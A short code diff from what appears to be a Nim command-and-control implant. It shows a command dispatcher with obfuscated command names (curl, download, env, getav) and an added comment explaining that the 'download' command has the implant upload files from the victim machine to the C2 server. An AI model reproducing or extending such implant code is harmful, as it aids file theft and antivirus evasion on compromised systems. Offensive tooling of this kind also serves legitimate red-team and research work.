@@ -38,7 +38,9 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
         elif cmd == obf("curl"):
             result = curl(li, args)
         elif cmd == obf("download"):
-            result = download(li, cmdGuid, args)
+            # This is the operator console download command process, 
+            # In our side, implant must UPLOAD a file to C2 (it will download a file to C2 from operator perspective)
+            result = download(li, cmdGuid, args) 
         elif cmd == obf("env"):
             result = env()
         elif cmd == obf("getav"):
